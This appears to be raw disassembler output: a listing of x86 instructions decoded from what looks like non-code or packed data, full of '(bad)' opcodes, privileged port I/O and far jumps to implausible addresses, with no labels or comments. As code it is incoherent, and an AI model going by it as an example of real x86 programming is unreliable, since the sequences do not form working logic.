  4113a1:	je     0x411342
  4113a3:	aaa    
  4113a4:	inc    edi
  4113a5:	(bad)  [edx-0x61]
  4113a8:	sahf   
  4113a9:	test   BYTE PTR [esi],0x48
  4113ac:	or     al,0xe9
  4113ae:	xchg   ebx,eax
  4113af:	cmp    DWORD PTR [edx+0xd],edi
  4113b2:	fs xor ch,dh
  4113b5:	inc    esp
  4113b6:	add    BYTE PTR [eax],al
  4113b8:	add    BYTE PTR [eax],al
  4113ba:	add    BYTE PTR [ecx+0x6b006f35],al
  4113c0:	scas   eax,DWORD PTR es:[edi]
  4113c1:	push   cs
  4113c2:	mov    ebp,DWORD PTR [esi-0x450521a2]
  4113c8:	adc    cl,BYTE PTR [edi]
  4113ca:	add    BYTE PTR [edx+0x4d448701],dh
  4113d0:	push   edi
  4113d1:	xchg   BYTE PTR [ebp+ecx*2+0x53],cl
  4113d5:	jno    0x41140a
  4113d7:	mov    dl,0xbf
  4113d9:	test   cl,ch
  4113db:	inc    esi
  4113dc:	or     DWORD PTR [edx],eax
  4113de:	maxps  xmm7,XMMWORD PTR [ecx+0xe]
  4113e2:	ror    DWORD PTR [eax],0xb7
  4113e5:	add    ecx,eax
  4113e7:	inc    edx
  4113e8:	std    
  4113e9:	jnp    0x4113f4
  4113eb:	cli    
  4113ec:	dec    ecx
  4113ed:	sub    eax,DWORD PTR [ebp-0x4e]
  4113f0:	and    DWORD PTR [edi],ecx
  4113f2:	jl     0x411442
  4113f4:	cmp    BYTE PTR [ebx+0x24],ah
  4113f7:	popf   
  4113f8:	cmp    eax,0x3df52463
  4113fd:	inc    ebx
  4113fe:	and    al,0x8d
  411400:	aaa    
  411401:	jnp    0x411427
  411403:	cmp    DWORD PTR ds:0x8591244b,0x4f263bf9
  41140d:	add    BYTE PTR [ebp+0xeb4e7],cl
  411413:	inc    edx
  411414:	lahf   
  411415:	xor    al,0x47
  411417:	ror    DWORD PTR [eax+0x52],1
  41141a:	(bad)  
  41141b:	icebp  
  41141c:	mov    ah,0x85
  41141e:	dec    esp
  41141f:	add    BYTE PTR [eax],al
  411421:	add    BYTE PTR [eax],al
  411423:	add    ch,cl
  411425:	data16 and al,0x57
  411428:	int    0x37
  41142a:	pop    ebx
  41142b:	and    al,0x55
  41142d:	cmp    DWORD PTR [ebp+0x2],ecx
  411430:	sub    DWORD PTR ds:0x60d915f0,esp
  411436:	das    
  411437:	add    al,dl
  411439:	daa    
  41143a:	mov    al,al
  41143c:	nop
  41143d:	push   es
  41143e:	(bad)  [edx+0xefeafbc]
  411444:	data16 add BYTE PTR es:[esi-0x1fb5a52e],dh
  41144c:	cwde   
  41144d:	push   esp
  41144e:	inc    ebx
  41144f:	add    bl,BYTE PTR [ecx+0x65]
  411452:	jg     0x411477
  411454:	enter  0xb5a,0x0
  411458:	mov    ch,0x57
  41145a:	test   BYTE PTR [esi-0x64],al
  41145d:	adc    bh,0x87
  411460:	xchg   edi,eax
  411461:	push   es
  411462:	sbb    eax,DWORD PTR [eax]
  411464:	nop
  411465:	pop    ebx
  411466:	xor    BYTE PTR [ebx+0x6c],0x8b
  41146a:	aam    0x56
  41146c:	mov    eax,0x548b0969
  411471:	outs   dx,DWORD PTR ds:[esi]
  411472:	repz jmp 0xe4ac:0x23dee542
  41147a:	(bad)  
  41147b:	and    edi,DWORD PTR [eax-0x53b47de6]
  411481:	scas   eax,DWORD PTR es:[edi]
  411482:	ror    DWORD PTR [esi-0x50],cl
  411485:	pusha  
  411486:	sahf   
  411487:	mov    ebx,0x0
  41148c:	add    BYTE PTR [ecx+0x588d0b5b],dl
  411492:	pop    ebp
  411493:	or     BYTE PTR [ebx+0x6c],0x67
  411497:	or     al,0x47
  411499:	je     0x41147d
  41149b:	(bad)  
  41149c:	and    ebp,DWORD PTR [eax-0x24]
  41149f:	dec    edx
  4114a0:	add    DWORD PTR [eax+0x2a],eax
  4114a3:	adc    BYTE PTR [eax+eiz*1],dl
  4114a6:	popa   
  4114a7:	retf   
  4114a8:	(bad)  
  4114a9:	cmp    BYTE PTR [edx],dl
  4114ab:	xchg   BYTE PTR [edi+0x71ce87],bh
  4114b1:	nop
  4114b2:	pop    ebx
  4114b3:	test   BYTE PTR [ebx-0x54],al
  4114b6:	jae    0x4114b8
  4114b8:	mov    dh,0x88
  4114ba:	mov    dl,0xf8
  4114bc:	push   ebp
  4114bd:	mov    bh,0xb3
  4114bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114c0:	and    al,0x97
  4114c2:	mov    ebp,0xad5902ad
  4114c7:	push   ecx
  4114c8:	out    0xd7,eax
  4114ca:	mov    bl,0xe5
  4114cc:	add    edx,ebp
  4114ce:	mov    dh,0x7c
  4114d0:	(bad)  
  4114d1:	fwait
  4114d2:	stos   DWORD PTR es:[edi],eax
  4114d3:	icebp  
  4114d4:	mov    edx,DWORD PTR [esi-0x6ffb99c9]
  4114da:	mov    dl,0x7c
  4114dc:	(bad)  
  4114dd:	jae    0x41146d
  4114df:	and    eax,0xf58ea38d
  4114e4:	mov    ebx,ss
  4114e6:	mov    cs,ecx
  4114e8:	fcmovbe st,st(6)
  4114ea:	xchg   edx,eax
  4114eb:	clc    
  4114ec:	nop
  4114ed:	mov    ebx,0x3e5b3
  4114f2:	add    BYTE PTR [eax],al
  4114f4:	add    BYTE PTR [eax],al
  4114f6:	sbb    ebp,esi
  4114f8:	shr    ebx,0x1a
  4114fb:	test   cl,0xef
  4114fe:	jmp    0xe5b2:0x23867c46
  411505:	add    edx,DWORD PTR ds:0xba87e872
  41150b:	push   0x208e1e40
  411510:	xchg   edx,eax
  411511:	pop    es
  411512:	xchg   DWORD PTR [eax],esp
  411514:	stos   BYTE PTR es:[edi],al
  411515:	or     cl,dl
  411517:	push   ebx
  411518:	in     eax,dx
  411519:	or     ah,al
  41151b:	cmp    bl,BYTE PTR [ecx+0x2b336be7]
  411521:	push   ds
  411522:	mov    dh,0xb1
  411524:	in     eax,0xe
  411526:	adc    al,0xa0
  411528:	out    0x3,al
  41152a:	nop
  41152b:	cmp    eax,0x689f7768
  411530:	in     eax,0xda
  411532:	inc    edi
  411533:	scas   al,BYTE PTR es:[edi]
  411534:	loopne 0x4114bd
  411536:	mov    dh,0xb1
  411538:	push   cs
  411539:	jmp    0xc5bb4ed1
  41153e:	xor    DWORD PTR ds:0x2d854ef5,0x3
  411545:	call   0x56ccc7dd
  41154a:	ins    BYTE PTR es:[edi],dx
  41154b:	push   0x3d6c3684
  411550:	enter  0x1870,0x94
  411554:	es jo  0x4115af
  411557:	xchg   esp,eax
  411558:	sub    dh,BYTE PTR [edi]
  41155a:	add    BYTE PTR [eax],al
  41155c:	add    BYTE PTR [eax],al
  41155e:	add    BYTE PTR [ebx+0x3d],ah
  411561:	jp     0x411568
  411563:	inc    eax
  411564:	cmp    eax,0xb9ddf6e6
  411569:	call   DWORD PTR [esi+0x52]
  41156c:	mov    bl,0xcd
  41156e:	mov    BYTE PTR [ebx+edi*4-0x1c322d3a],dl
  411575:	add    eax,0x4993dcea
  41157a:	ret    0xc83c
  41157d:	jb     0x41150d
  41157f:	sbb    ebx,esp
  411581:	sub    al,ch
  411583:	or     ah,bl
  411585:	sub    al,BYTE PTR ds:0x52af409
  41158b:	sbb    eax,DWORD PTR [ebx+ebp*1]
  41158e:	add    ecx,eax
  411590:	pop    ebp
  411591:	xor    esp,DWORD PTR [esi-0x787e470d]
  411597:	mov    WORD PTR [edx-0x53a58df2],?
  41159d:	push   edi
  41159e:	add    DWORD PTR [esi],ebx
  4115a0:	add    BYTE PTR [ebx+ebp*1-0x32a5c66e],cl
  4115a7:	mov    ebx,0x1ac53f9c
  4115ac:	cld    
  4115ad:	sub    al,ch
  4115af:	push   ss
  4115b0:	repz or al,0xb9
  4115b3:	loope  0x41161d
  4115b5:	sbb    DWORD PTR [eax],eax
  4115b7:	sbb    DWORD PTR [ebp+0x2f],ebx
  4115ba:	add    BYTE PTR [eax],dh
  4115bc:	sub    al,0x8a
  4115be:	rol    BYTE PTR [eax*4+0x4c84],0x0
  4115c6:	add    BYTE PTR [eax],al
  4115c8:	push   ebp
  4115c9:	push   edi
  4115ca:	add    BYTE PTR [esi+0x51b8b668],dh
  4115d0:	js     0x4115c6
  4115d2:	iret   
  4115d3:	or     BYTE PTR [edx-0x5d],dh
  4115d6:	test   BYTE PTR [edi+0xeb3e5],al
  4115dc:	sbb    BYTE PTR [esi],0xb
  4115df:	div    ebx
  4115e1:	imul   ebx,ebp,0x2b1fb042
  4115e7:	adc    BYTE PTR [esi+0x30],bl
  4115ea:	mov    DWORD PTR [eax],eax
  4115ec:	sub    DWORD PTR [ebx+0x6b555483],esi
  4115f2:	xor    al,0x4f
  4115f4:	push   ecx
  4115f5:	ds mov eax,0x2b5a758b
  4115fb:	mov    esi,DWORD PTR [ebp+0x5a]
  4115fe:	daa    
  4115ff:	inc    eax
  411600:	sub    BYTE PTR [edi+0x2b],0x24
  411604:	inc    edx
  411605:	outs   dx,BYTE PTR ds:[esi]
  411606:	(bad)  
  411608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411609:	aaa    
  41160a:	inc    ebp
  41160b:	add    al,BYTE PTR [eax-0x5d3d489]
  411611:	sbb    eax,0x4f25892b
  411616:	daa    
  411617:	lea    ebp,[ebx]
  411619:	mov    cl,0x5e
  41161b:	push   ecx
  41161c:	dec    esi
  41161d:	pusha  
  41161e:	pop    edi
  41161f:	push   ss
  411620:	stc    
  411621:	mov    dl,0x55
  411623:	pop    ecx
  411624:	xor    al,0xf3
  411626:	jp     0x41165e
  411628:	xor    bl,BYTE PTR [edi]
  41162a:	sub    ebp,DWORD PTR [eax]
  41162c:	add    BYTE PTR [eax],al
  41162e:	add    BYTE PTR [eax],al
  411630:	add    BYTE PTR [esi+0x470f0dfc],bh
  411636:	jns    0x411646
  411638:	rcl    DWORD PTR [eax-0x37f4fc47],0xd3
  41163f:	mov    dl,BYTE PTR [ebx+0x2b0b5990]
  411645:	fmul   DWORD PTR [edi+0x1a]
  411648:	fsubr  DWORD PTR [ebx-0x3377336e]
  41164e:	outs   dx,DWORD PTR ds:[esi]
  41164f:	sti    
  411650:	je     0x4115fa
  411652:	loopne 0x411622
  411654:	and    esi,DWORD PTR [eax+eiz*8-0x644bdc3a]
  41165b:	add    DWORD PTR [ebx-0x4c],0xb046cfaf
  411662:	out    dx,eax
  411663:	pop    eax
  411664:	push   cs
  411665:	push   es
  411666:	xchg   edi,eax
  411667:	or     DWORD PTR [edi],ecx
  411669:	(bad)  
  41166a:	xchg   esi,eax
  41166b:	or     cl,al
  41166d:	xor    DWORD PTR [eax+eax*1-0x38],edx
  411671:	sub    esp,DWORD PTR [edx-0x28]
  411674:	mov    edi,0x23cee2d0
  411679:	xor    BYTE PTR [ecx+0x32935907],0x87
  411680:	jnp    0x4116ee
  411682:	mov    ecx,DWORD PTR [ebx]
  411684:	unpckhps xmm7,xmm3
  411687:	cmc    
  411688:	inc    DWORD PTR [edi]
  41168a:	fcom   QWORD PTR [ebp+0x6f8463ff]
  411690:	xchg   esi,eax
  411691:	xchg   ebp,eax
  411692:	pop    ebx
  411693:	or     ebp,ecx
  411695:	add    BYTE PTR [eax],al
  411697:	add    BYTE PTR [eax],al
  411699:	add    BYTE PTR [ebx-0x68fff4a7],ah
  41169f:	inc    ebp
  4116a0:	mov    ebp,0xcd3d8f00
  4116a5:	add    ecx,edx
  4116a7:	stc    
  4116a8:	add    cl,BYTE PTR [ebx]
  4116aa:	loopne 0x41168e
  4116ac:	jnp    0x411631
  4116ae:	nop
  4116af:	pop    ebx
  4116b0:	or     ecx,DWORD PTR [ebp+0x43828994]
  4116b6:	ins    BYTE PTR es:[edi],dx
  4116b7:	mov    dl,0xf1
  4116b9:	ficom  WORD PTR [esi-0x42]
  4116bc:	xchg   ecx,eax
  4116bd:	push   cs
  4116be:	arpl   WORD PTR [edx-0x5b],si
  4116c1:	mov    WORD PTR [esi-0x56],ss
  4116c4:	push   cs
  4116c5:	or     eax,0x8ee5b292
  4116ca:	(bad)  
  4116cb:	ret    0xcb7c
  4116ce:	fwait
  4116cf:	cdq    
  4116d0:	and    ecx,DWORD PTR [edi-0x7126711d]
  4116d6:	xchg   ebx,eax
  4116d7:	xor    edi,DWORD PTR [esi-0x1]
  4116da:	add    BYTE PTR [ecx],bh
  4116dc:	sub    BYTE PTR [eax],cl
  4116de:	sbb    edi,DWORD PTR [ecx+0xc]
  4116e1:	retf   
  4116e2:	idiv   DWORD PTR [ebx]
  4116e4:	adc    DWORD PTR [ebx+edx*4-0x55],esi
  4116e8:	push   ecx
  4116e9:	(bad)  
  4116eb:	mov    bl,0xe5
  4116ed:	add    edx,DWORD PTR [edi-0x6ffb68cb]
  4116f3:	mov    dl,0x52
  4116f5:	lds    edx,FWORD PTR [ecx-0x6ffaf6a5]
  4116fb:	mov    dl,0x7c
  4116fd:	push   0x0
  4116ff:	add    BYTE PTR [eax],al
  411701:	add    BYTE PTR [eax],al
  411703:	add    esi,DWORD PTR [edx+0x571503e5]
  411709:	sar    BYTE PTR [edi+0x1a],1
  41170c:	(bad)  
  41170d:	in     eax,0x3
  41170f:	leave  
  411710:	fucomip st,st(1)
  411712:	or     cl,BYTE PTR ds:0x9003d760
  411718:	cmp    DWORD PTR [edx],ebp
  41171a:	add    al,0x9
  41171c:	sub    eax,0xb2900371
  411721:	jl     0x4116e3
  411723:	xchg   edi,eax
  411724:	jae    0x41176b
  411726:	add    eax,0x7da6540
  41172b:	xlat   BYTE PTR ds:[ebx]
  41172c:	fdiv   st(1),st
  41172e:	sbb    ah,BYTE PTR [esi+edx*8+0x37c7c3d7]
  411735:	push   cs
  411736:	lods   al,BYTE PTR ds:[esi]
  411737:	scas   eax,DWORD PTR es:[edi]
  411738:	aaa    
  411739:	popa   
  41173a:	loope  0x411740
  41173c:	xor    DWORD PTR [edx],ebp
  41173e:	mov    ebp,0x720eb294
  411743:	out    0x90,eax
  411745:	dec    edx
  411746:	push   0x5f
  411748:	mov    ecx,0xf4b76585
  41174d:	or     eax,0x885993e9
  411752:	call   0x3f40c9ea
  411757:	push   eax
  411758:	mov    bl,0x85
  41175a:	gs push edi
  41175c:	hlt    
  41175d:	or     eax,0xcd893e9
  411762:	inc    ecx
  411763:	lea    ebx,[edx-0x7b]
  411766:	inc    ebp
  411767:	add    BYTE PTR [eax],al
  411769:	add    BYTE PTR [eax],al
  41176b:	add    BYTE PTR [eax-0x38],dh
  41176e:	in     eax,0x8e
  411770:	jbe    0x4117d6
  411772:	out    dx,eax
  411773:	jb     0x411785
  411775:	nop
  411776:	push   edx
  411777:	call   0x608fca0f
  41177c:	push   eax
  41177d:	nop
  41177e:	sbb    bl,BYTE PTR [ecx]
  411780:	add    bh,dh
  411782:	out    dx,eax
  411783:	pop    ebp
  411784:	xor    BYTE PTR [eax],cl
  411786:	push   cs
  411787:	jmp    0xea9a4d1f
  41178c:	loopne 0x4117f2
  41178e:	mov    edx,0xeb2dfc5
  411793:	jmp    0x1d6b3740
  411798:	xchg   ebx,eax
  411799:	mov    dl,0xe
  41179b:	sbb    BYTE PTR ds:0x95d8e679,cl
  4117a1:	fs out dx,eax
  4117a3:	sbb    bl,BYTE PTR [ebx-0xe]
  4117a6:	xor    ebp,DWORD PTR [eax]
  4117a8:	add    BYTE PTR [ecx+esi*1-0x109b7810],bl
  4117af:	aad    0xc2
  4117b1:	cs into 
  4117b3:	add    BYTE PTR ds:0x851e31b7,cl
  4117b9:	leave  
  4117ba:	lock cvttps2pi mm6,QWORD PTR [ecx-0x4556fff0]
  4117c2:	mov    eax,0xb8bab84d
  4117c7:	inc    ebp
  4117c8:	mov    ebx,0xb208eef0
  4117cd:	test   DWORD PTR [ecx+ebp*8],0x0
  4117d4:	add    BYTE PTR [ecx],ch
  4117d6:	cmp    ebp,edi
  4117d8:	push   ebx
  4117d9:	or     al,0x69
  4117db:	test   BYTE PTR [ebp+ecx*2+0x69000e6f],cl
  4117e2:	ss dec ebx
  4117e4:	and    al,0x5d
  4117e6:	xchg   esi,eax
  4117e7:	xchg   edx,eax
  4117e8:	mov    edi,DWORD PTR [esi-0x727b79c2]
  4117ee:	outs   dx,BYTE PTR ds:[esi]
  4117ef:	push   cs
  4117f0:	add    BYTE PTR [ecx-0x6a],ch
  4117f3:	or     al,0x33
  4117f5:	xor    BYTE PTR [eax+0x6f],dh
  4117f8:	jge    0x411833
  4117fa:	adc    al,0x0
  4117fc:	test   BYTE PTR [esp+eax*4-0x11],dl
  411800:	jmp    FWORD PTR [ebp+0x28582b2b]
  411806:	scas   eax,DWORD PTR es:[edi]
  411807:	push   cs
  411808:	bsf    ebx,DWORD PTR [ecx+edx*1]
  41180c:	add    BYTE PTR [ecx],bh
  41180e:	mov    edx,0xba284db8
  411813:	mov    eax,0xeef02b45
  411818:	or     BYTE PTR [edx],al
  41181a:	test   DWORD PTR [ecx+ebp*8],0x53ef3c79
  411821:	std    
  411822:	xchg   ebp,eax
  411823:	test   BYTE PTR [edi+0xeaf69],al
  411829:	pusha  
  41182a:	jecxz  0x411857
  41182c:	dec    eax
  41182d:	clc    
  41182e:	scas   al,BYTE PTR es:[edi]
  41182f:	push   cs
  411830:	jmp    0x4c43c5
  411835:	nop
  411836:	shr    BYTE PTR [edi+0x23],1
  411839:	add    BYTE PTR [eax],al
  41183b:	add    BYTE PTR [eax],al
  41183d:	add    BYTE PTR [edx+ebx*2+0xb],ch
  411841:	add    BYTE PTR [eax-0x1e],dl
  411844:	scas   eax,DWORD PTR es:[edi]
  411845:	and    esp,DWORD PTR [ecx+ecx*2-0x2348aa43]
  41184c:	iret   
  41184d:	pop    ebx
  41184e:	xchg   ecx,eax
  41184f:	pop    ecx
  411850:	or     ecx,DWORD PTR [ebp-0x141a7c3]
  411856:	in     al,0x74
  411858:	mov    bh,0x0
  41185a:	nop
  41185b:	pop    ecx
  41185c:	push   ss
  41185d:	mov    bl,0xb4
  41185f:	pop    ss
  411860:	or     al,0x0
  411862:	nop
  411863:	cmp    al,BYTE PTR [edx+0x143f68ca]
  411869:	(bad)  
  41186a:	ja     0x411889
  41186c:	cmp    DWORD PTR [ecx-0x55],eax
  41186f:	or     eax,0xb6e68407
  411874:	or     al,BYTE PTR [eax]
  411876:	popf   
  411877:	bound  edx,QWORD PTR [edi]
  411879:	(bad)  
  41187a:	push   edi
  41187b:	sub    DWORD PTR [edi+0x72],0x3d0b4b75
  411882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411883:	pop    ds
  411884:	pop    ss
  411885:	inc    ah
  411887:	push   0x11341ad6
  41188c:	pop    ss
  41188d:	jae    0x4118f7
  41188f:	push   esi
  411890:	cmc    
  411891:	sti    
  411892:	daa    
  411893:	inc    ecx
  411894:	sahf   
  411895:	xor    BYTE PTR ds:0x550a9e0c,dl
  41189b:	push   ecx
  41189c:	pop    ss
  41189d:	dec    BYTE PTR [edi]
  41189f:	imul   ecx,DWORD PTR [esi+0x2d],0x4ba50000
  4118a9:	or     ecx,DWORD PTR [edi]
  4118ab:	inc    esi
  4118ac:	xchg   edi,eax
  4118ad:	or     DWORD PTR [edi],ecx
  4118af:	ds xchg edi,eax
  4118b1:	or     al,0xc1
  4118b3:	icebp  
  4118b4:	mov    dl,0xfd
  4118b6:	or     bl,al
  4118b8:	mov    ch,0x5e
  4118ba:	test   BYTE PTR [edx+esi*4-0x4f],bl
  4118be:	nop
  4118bf:	mov    cl,0x2d
  4118c1:	push   ecx
  4118c2:	loopne 0x411853
  4118c4:	mov    bl,0xe5
  4118c6:	add    ebx,DWORD PTR [ebx]
  4118c8:	test   DWORD PTR [ecx],0xe832aaf0
  4118ce:	dec    ebp
  4118cf:	inc    esp
  4118d0:	mov    bl,0xd0
  4118d2:	dec    ebp
  4118d3:	push   esp
  4118d4:	mov    ah,0x26
  4118d6:	and    eax,0x33dad8f
  4118db:	test   eax,0x3c039a32
  4118e0:	out    0xc,al
  4118e2:	and    BYTE PTR [ebx],0x96
  4118e5:	lods   eax,DWORD PTR ds:[esi]
  4118e6:	add    al,0x90
  4118e8:	mov    dl,0xe0
  4118ea:	and    BYTE PTR [esi+edx*4-0x1b],0x3
  4118ef:	adc    esi,DWORD PTR [edi-0x1c]
  4118f2:	mov    ebx,?
  4118f4:	xchg   esi,eax
  4118f5:	or     DWORD PTR ds:0x16d05bd1,ebp
  4118fb:	mov    gs,WORD PTR [eax]
  4118fd:	sub    al,BYTE PTR ds:0x22a2887
  411903:	push   ecx
  411904:	push   ebx
  411905:	std    
  411906:	or     bl,BYTE PTR [eax-0x73]
  411909:	scas   al,BYTE PTR es:[edi]
  41190a:	fiadd  DWORD PTR [eax]
  41190c:	add    BYTE PTR [eax],al
  41190e:	add    BYTE PTR [eax],al
  411910:	fmulp  st(2),st
  411912:	call   0xe5d74798
  411917:	add    ebp,DWORD PTR [ebx+0x1]
  41191a:	cs xchg ebx,eax
  41191c:	sub    esi,DWORD PTR ds:[eax]
  41191f:	pushf  
  411920:	sub    al,BYTE PTR [esi+eax*2-0x1a09555d]
  411927:	mov    WORD PTR [ebx-0x6a],ss
  41192a:	aad    0x80
  41192c:	inc    edi
  41192d:	mov    cl,0x69
  41192f:	push   ebp
  411930:	jmp    DWORD PTR [eax+0xe]
  411933:	jmp    0xbaa80942
  411938:	push   ebx
  411939:	mov    eax,ds:0x30c76d85
  41193e:	push   cs
  41193f:	jmp    0xacf9cad7
  411944:	mov    WORD PTR [ebx],gs
  411946:	mov    al,BYTE PTR ds:0xe9ef6140
  41194c:	sbb    bh,al
  41194e:	add    dh,BYTE PTR [eax+0x3f]
  411951:	xchg   ebp,eax
  411952:	xchg   esi,eax
  411953:	jmp    0xa6c4cbeb
  411958:	test   DWORD PTR [ebx-0x6ad88f33],0xb293e9ae
  411962:	sub    DWORD PTR [ebp-0x49],0xffffffa0
  411966:	or     eax,0xcd8b93e9
  41196b:	jo     0x411974
  41196d:	xchg   esp,eax
  41196e:	stos   BYTE PTR es:[edi],al
  41196f:	jmp    0x65c6cc07
  411974:	add    BYTE PTR [eax],al
  411976:	add    BYTE PTR [eax],al
  411978:	add    BYTE PTR [edi+0x3c],dl
  41197b:	push   cs
  41197c:	jmp    0x130c4514
  411981:	shl    DWORD PTR [eax+0x29922cb8],cl
  411987:	mov    cl,BYTE PTR ds:0xe9ef5fe4
  41198d:	xchg   esp,eax
  41198e:	sub    BYTE PTR [ecx-0x16],cl
  411991:	rcl    BYTE PTR [edx+0x6],cl
  411994:	repnz retf 
  411996:	mov    al,0xb8
  411998:	sub    al,0x37
  41199a:	sub    eax,DWORD PTR [edx-0x10a033fb]
  4119a0:	jmp    0xe5824231
  4119a5:	rcl    BYTE PTR [edx+0x6],cl
  4119a8:	loop   0x411975
  4119aa:	sub    al,0x8a
  4119ac:	(bad)
  4119af:	push   cs
  4119b0:	add    cl,bh
  4119b2:	fsub   QWORD PTR [edx+eax*8]
  4119b5:	sbb    BYTE PTR [edi-0x283a7b7a],bh
  4119bb:	out    dx,eax
  4119bc:	(bad)  
  4119bd:	stc    
  4119be:	sub    cl,BYTE PTR [eax+0xeb3f984]
  4119c4:	mov    DWORD PTR [ebp+0x52],esi
  4119c7:	lahf   
  4119c8:	add    cl,ch
  4119ca:	mov    bl,0x83
  4119cc:	xchg   DWORD PTR [ecx-0x4a],eax
  4119cf:	push   cs
  4119d0:	add    BYTE PTR [eax+0x2a],al
  4119d3:	sub    edi,DWORD PTR [ecx+ebp*4+0x2d8d0eb3]
  4119da:	push   edx
  4119db:	jg     0x4119dd
  4119dd:	add    BYTE PTR [eax],al
  4119df:	add    BYTE PTR [eax],al
  4119e1:	add    BYTE PTR [ecx-0x2a7b7a4d],bh
  4119e7:	out    dx,eax
  4119e8:	out    dx,eax
  4119e9:	jmp    FWORD PTR [ecx-0x66dba43a]
  4119ef:	loopne 0x4119a0
  4119f1:	pmaxsw mm4,QWORD PTR [ebx+0x28]
  4119f5:	add    BYTE PTR [ecx-0x4a],bh
  4119f8:	xchg   ch,ch
  4119fa:	jb     0x4119af
  4119fc:	push   cs
  4119fd:	and    DWORD PTR [eax+eiz*2-0x3980011a],0xfffffff0
  411a05:	mov    esi,ebp
  411a07:	jg     0x411a5c
  411a09:	add    DWORD PTR [ecx-0x4d],ebp
  411a0c:	dec    esi
  411a0d:	mov    ebp,ecx
  411a0f:	push   edx
  411a10:	sbb    ecx,DWORD PTR [ecx-0x7700ad83]
  411a16:	jne    0x411a6a
  411a18:	and    edx,DWORD PTR [eax-0x59]
  411a1b:	lds    edi,FWORD PTR [ebx+0xeb39d24]
  411a21:	add    ah,cl
  411a23:	adc    BYTE PTR [edi+edi*8],cl
  411a26:	lds    edi,FWORD PTR [edi+0x53]
  411a29:	add    DWORD PTR [ecx],ebp
  411a2b:	mov    bl,0x57
  411a2d:	call   DWORD PTR [eax-0x6ea43003]
  411a33:	dec    ecx
  411a34:	or     edi,edi
  411a36:	cmp    al,0x6d
  411a38:	mov    bh,0x0
  411a3a:	nop
  411a3b:	dec    ecx
  411a3c:	mov    esp,0x5f30cb8a
  411a41:	imul   bh
  411a43:	iret   
  411a44:	fmulp  st(0),st
  411a46:	add    BYTE PTR [eax],al
  411a48:	add    BYTE PTR [eax],al
  411a4a:	add    BYTE PTR [ecx-0x6c],dl
  411a4d:	dec    ebx
  411a4e:	jae    0x4119f1
  411a50:	(bad)  
  411a51:	dec    ebx
  411a52:	jae    0x4119df
  411a54:	xabort 0xfb
  411a57:	iret   
  411a58:	out    dx,eax
  411a59:	or     al,BYTE PTR [ebp+0xb5421]
  411a5f:	(bad)  
  411a60:	out    0xc8,eax
  411a62:	add    BYTE PTR [edi-0x2efe4f21],al
  411a68:	jmp    0x4c192570
  411a6d:	and    al,0x7f
  411a6f:	sbb    eax,0x79749f49
  411a74:	aam    0x87
  411a76:	and    edx,eax
  411a78:	dec    edx
  411a79:	or     eax,DWORD PTR [eax]
  411a7b:	sbb    edx,DWORD PTR [eax]
  411a7d:	iret   
  411a7e:	sub    ebp,DWORD PTR [ebx-0x2]
  411a81:	xchg   BYTE PTR [esi+0x0],dl
  411a84:	rcr    DWORD PTR [edi+0x23],cl
  411a87:	ror    BYTE PTR [edx+0xb],1
  411a8a:	add    BYTE PTR [ebx+0x4d],bh
  411a8d:	jo     0x411a22
  411a8f:	mov    ah,0x8b
  411a91:	or     DWORD PTR [eax],eax
  411a93:	nop
  411a94:	rol    ebp,1
  411a96:	dec    DWORD PTR [ebx-0x7bf86972]
  411a9c:	mov    edi,0xa8bb850b
  411aa1:	or     al,BYTE PTR [eax]
  411aa3:	xchg   ebp,ebx
  411aa5:	int    0x0
  411aa7:	lahf   
  411aa8:	in     eax,0xc5
  411aaa:	add    DWORD PTR [ecx-0x4d],edx
  411aad:	xchg   ah,bh
  411aaf:	add    BYTE PTR [eax],al
  411ab1:	add    BYTE PTR [eax],al
  411ab3:	add    BYTE PTR [edx-0x68e31b96],cl
  411ab9:	(bad)  
  411abb:	mov    bh,0x83
  411abd:	dec    ecx
  411abe:	gs xchg ecx,eax
  411ac0:	pop    es
  411ac1:	pop    es
  411ac2:	jge    0x411a4f
  411ac4:	jg     0x411a78
  411ac6:	in     eax,0x3
  411ac8:	or     edi,esi
  411aca:	icebp  
  411acb:	jl     0x411ae0
  411acd:	xchg   edi,eax
  411ace:	sub    eax,0xf8b29005
  411ad3:	xchg   DWORD PTR [ebx-0x65ecafa4],esp
  411ad9:	inc    BYTE PTR [ecx]
  411adb:	hlt    
  411adc:	sahf   
  411add:	or     edx,DWORD PTR ss:[edx]
  411ae0:	(bad)  
  411ae1:	pop    ebp
  411ae2:	jp     0x411aa5
  411ae4:	xchg   edx,eax
  411ae5:	sub    esp,DWORD PTR [ecx-0x1cd9419]
  411aeb:	in     al,dx
  411aec:	and    al,0xc1
  411aee:	rcr    BYTE PTR [ecx+0x4c],1
  411af1:	mov    dh,0x64
  411af3:	push   0x3e70273
  411af8:	nop
  411af9:	pop    edx
  411afa:	out    dx,al
  411afb:	xchg   DWORD PTR [ebx-0x6ffc18fe],esi
  411b01:	sub    DWORD PTR [ecx-0x18],esp
  411b04:	(bad)  [ebx+0x32d003e5]
  411b0a:	jp     0x411b0f
  411b0c:	mov    DWORD PTR [edx],0xbbdc88d1
  411b12:	in     eax,0x3
  411b14:	(bad)  
  411b15:	pop    ebp
  411b16:	cdq    
  411b17:	out    0x0,eax
  411b19:	add    BYTE PTR [eax],al
  411b1b:	add    BYTE PTR [eax],al
  411b1d:	mov    ebx,0x4f03e5b3
  411b22:	or     DWORD PTR es:[eax-0x451a4d70],esi
  411b29:	ds or  DWORD PTR es:[eax-0x16f14d70],esi
  411b31:	and    BYTE PTR [ecx],0x2a
  411b34:	or     eax,0x3b0eb28d
  411b39:	lahf   
  411b3a:	add    BYTE PTR [ebx-0x7eb844e],0x96
  411b41:	mov    ds:0x18dece36,al
  411b46:	and    edx,DWORD PTR [ecx+ebp*8]
  411b49:	xchg   ebx,eax
  411b4a:	sub    DWORD PTR [edx-0x3b],esp
  411b4d:	jmp    FWORD PTR [ecx]
  411b4f:	mov    edx,0xeb23bcd
  411b54:	jmp    0xe9554add
  411b59:	xchg   ebx,eax
  411b5a:	lods   eax,DWORD PTR ds:[esi]
  411b5b:	mov    eax,0xb8ad8cac
  411b60:	lods   al,BYTE PTR ds:[esi]
  411b61:	xchg   ebp,eax
  411b62:	jae    0x411b51
  411b64:	loope  0x411b2c
  411b66:	je     0x411b73
  411b68:	push   eax
  411b69:	adc    ebx,esi
  411b6b:	push   cs
  411b6c:	xchg   ebp,eax
  411b6d:	pop    ds
  411b6e:	dec    eax
  411b6f:	in     eax,0x88
  411b71:	sbb    BYTE PTR [edi+ebp*8+0x62],0xf
